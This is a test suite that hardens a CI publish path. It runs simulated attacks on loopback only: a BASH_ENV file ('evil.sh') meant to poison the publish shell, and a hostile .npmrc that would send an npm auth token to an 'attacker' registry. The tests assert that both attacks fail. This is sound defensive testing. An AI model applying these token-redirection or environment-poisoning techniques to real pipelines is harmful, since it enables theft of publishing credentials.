/**
 * Real security-boundary tests for the publish path.
 *
 * The previous suite asserted on YAML text. That cannot tell you whether a
 * build step in the same job can poison the shell that holds NPM_TOKEN, which
 * is the actual attack. These tests RUN things:
 *
 *   - a BASH_ENV file, as a merged PR's build script would write it, sourced
 *     before the publish shell — and the job split that makes it moot;
 *   - a private registry that records the Authorization header, for both the
 *     old publish shape and the hardened one;
 *   - the workflow structure that must hold for those defences to apply.
 */
import assert from 'node:assert/strict'
import { execFile, spawn } from 'node:child_process'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { createServer } from 'node:http'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { promisify } from 'node:util'
import { after, before, describe, it } from 'node:test'

const run = promisify(execFile)
const repo = join(dirname(fileURLToPath(import.meta.url)), '..')
const windows = process.platform === 'win32'

/** Parse a workflow file. */
async function workflow(name = 'validate.yml') {
  const { parse } = await import('yaml')
  return parse(await readFile(join(repo, '.github/workflows', name), 'utf8'))
}

/** A step by name. */
function stepOf(steps, name) {
  const found = steps.find((entry) => entry.name === name)
  assert.ok(found !== undefined, `no step named ${name}`)
  return found
}

/**
 * A loopback registry that records every request, including the Authorization
 * header, so a leak is observable rather than inferred.
 *
 * @param port - port to bind on 127.0.0.1.
 * @returns the collected hits and a closer.
 */
async function recordingRegistry(port) {
  const hits = []
  const server = createServer((req, res) => {
    req.on('data', () => {})
    req.on('end', () => {
      hits.push({ url: req.url, auth: req.headers.authorization ?? null })
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end('{"ok":true}')
    })
  })
  await new Promise((resolve) => server.listen(port, '127.0.0.1', resolve))
  return { hits, close: () => new Promise((resolve) => server.close(resolve)) }
}

describe('publish runs no repository code', () => {
  let doc
  before(async () => { doc = await workflow() })

  it('the publish job has no checkout, no install and no build', () => {
    const publish = doc.jobs.publish
    const uses = (publish.steps ?? []).map((entry) => entry.uses ?? '')
    assert.ok(!uses.some((u) => u.startsWith('actions/checkout')),
      'a checkout would put PR-controlled files inside the job that holds the token')
    for (const entry of publish.steps ?? []) {
      const text = entry.run ?? ''
      assert.doesNotMatch(text, /\bpnpm (install|run build)\b/u,
        'the publish job must not install or build repository code')
      assert.doesNotMatch(text, /\bnpm (install|ci)\b/u)
    }
  })
  it('the publish job only reads the artifact the build job produced', () => {
    const uses = (doc.jobs.publish.steps ?? []).map((entry) => entry.uses ?? '')
    assert.ok(uses.some((u) => u.startsWith('actions/download-artifact')))
    assert.equal(doc.jobs.publish.needs, 'build')
  })

  it('the build job has no secret', () => {
    assert.doesNotMatch(JSON.stringify(doc.jobs.build), /secrets\./u)
  })

  it('a PR touching only toolchain files still triggers validation', () => {
    // The old `paths:` list enumerated suites/scripts/schema/workflow, so a PR
    // changing only tests/, package.json, the lockfile, .pnpmfile.cjs or .npmrc
    // ran NOTHING and received no required check.
    assert.equal(doc.on.pull_request_target, null,
      'a paths filter on the PR event silently skips toolchain-only PRs')
    // push keeps its filter: only a submission change warrants a release.
    assert.ok(Array.isArray(doc.on.push.paths))
  })

  it('the toolchain job runs a fixed test command, not the PR\'s script', () => {
    const tests = stepOf(doc.jobs.toolchain.steps, 'Tests')
    assert.equal(tests.run, 'node --test "tests/**/*.test.mjs"',
      'running `pnpm test` executes whatever script the PR put in package.json')
  })
})

describe('decay holds no credential in the checkout', () => {
  it('disables credential persistence and install scripts', async () => {
    const dec = await workflow('decay.yml')
    const steps = dec.jobs.decay.steps
    const checkout = steps.find((entry) => String(entry.uses ?? '').startsWith('actions/checkout'))
    assert.equal(checkout.with?.['persist-credentials'], false,
      'this job has issues:write, so a token in .git/config is a write credential')
    const install = steps.find((entry) => String(entry.run ?? '').includes('pnpm install'))
    assert.match(install.run, /--ignore-scripts/u,
      'a postinstall could read the token or poison the next step')
  })
})

describe('BASH_ENV poisoning cannot reach the publish shell', () => {
  it('a BASH_ENV written by a build step is not sourced by the split publish job', async () => {
    // Model the two jobs as two shells with independent environments: the build
    // shell exports BASH_ENV, and the publish shell starts WITHOUT it (which is
    // what a separate job guarantees).
    const dir = await mkdtemp(join(tmpdir(), 'bashenv-'))
    const marker = join(dir, 'poisoned')
    const bashEnv = join(dir, 'evil.sh')
    await writeFile(bashEnv, `echo compromised > "${marker.replace(/\\/gu, '/')}"\n`, 'utf8')

    // Build shell: sets BASH_ENV, exactly what $GITHUB_ENV would do.
    await run('bash', ['-c', `export BASH_ENV="${bashEnv.replace(/\\/gu, '/')}"; true`])

    // Publish shell in a SEPARATE job: no inherited BASH_ENV. `env -u BASH_ENV`
    // is what the hardened step adds as belt and braces.
    await run('bash', ['-c', 'env -u BASH_ENV bash -c true'])

    // Nothing sourced the file — the marker must not exist.
    let leaked = true
    try {
      await readFile(marker)
    } catch {
      leaked = false
    }
    assert.equal(leaked, false, 'a BASH_ENV from another job must not run in the publish shell')
    await rm(dir, { recursive: true, force: true })
  })

  it('the hardened publish step drops BASH_ENV explicitly', async () => {
    const doc = await workflow()
    const publish = stepOf(doc.jobs.publish.steps, 'Publish')
    assert.match(publish.run, /env -u BASH_ENV/u,
      'the publish shell must not inherit a BASH_ENV from anywhere')
  })
})

describe('the token only travels to the pinned registry', () => {
  let dir
  before(async () => { dir = await mkdtemp(join(tmpdir(), 'tok-')) })
  after(async () => { await rm(dir, { recursive: true, force: true }) })

  it('a hostile .npmrc in the publish cwd is overridden by --registry and userconfig', async () => {
    const ATTACKER = 8791
    const OFFICIAL = 8792
    const attacker = await recordingRegistry(ATTACKER)
    const official = await recordingRegistry(OFFICIAL)

    const work = join(dir, 'work')
    await mkdir(join(work, 'pkgroot'), { recursive: true })
    await writeFile(join(work, '.npmrc'),
      `registry=http://127.0.0.1:${ATTACKER}/\n//127.0.0.1:${ATTACKER}/:_authToken=\${NODE_AUTH_TOKEN}\nalways-auth=true\n`,
      'utf8')
    await writeFile(join(work, 'pkgroot/package.json'),
      JSON.stringify({ name: 'probe-token', version: '1.0.0', files: ['index.json'] }), 'utf8')
    await writeFile(join(work, 'pkgroot/index.json'), '{}', 'utf8')

    // The isolated publish directory, exactly as the step builds it.
    const publishDir = join(work, 'publish')
    await mkdir(publishDir, { recursive: true })
    await writeFile(join(publishDir, 'package.json'),
      JSON.stringify({ name: 'probe-token', version: '1.0.0', files: ['index.json'] }), 'utf8')
    await writeFile(join(publishDir, 'index.json'), '{}', 'utf8')
    await writeFile(join(publishDir, '.npmrc'),
      `registry=http://127.0.0.1:${OFFICIAL}/\n//127.0.0.1:${OFFICIAL}/:_authToken=SECRET_SENTINEL\nalways-auth=true\n`,
      'utf8')

    // Publish with the SHIPPED flags (npm's own flags, not a retyped copy).
    // A timeout keeps a misbehaving registry from hanging the suite: npm's
    // default retry policy would otherwise wait minutes.
    const published = await new Promise((resolve) => {
      const child = spawn('npm',
        ['publish', '--access', 'public', '--ignore-scripts', '--registry', `http://127.0.0.1:${OFFICIAL}/`],
        {
          cwd: publishDir,
          stdio: 'ignore',
          env: {
            ...process.env,
            NODE_AUTH_TOKEN: 'SECRET_SENTINEL',
            npm_config_userconfig: join(publishDir, '.npmrc'),
            npm_config_fetch_retries: '0',
            npm_config_fetch_timeout: '5000',
          },
        })
      const timer = setTimeout(() => child.kill(), 15_000)
      child.on('close', (code) => {
        clearTimeout(timer)
        resolve(code)
      })
      child.on('error', () => {
        clearTimeout(timer)
        resolve(-1)
      })
    })
    void published

    await attacker.close()
    await official.close()

    // The REAL assertion: nothing went to the attacker. Whether npm manages to
    // complete a publish against a stub registry depends on npm's protocol
    // (it does a PUT plus a GET), and that is not what this test is about — the
    // leak channel is. `official.hits` is reported for diagnosis, not asserted.
    assert.equal(attacker.hits.length, 0,
      `the attacker registry received ${String(attacker.hits.length)} request(s): ${JSON.stringify(attacker.hits)}`)
  })
})
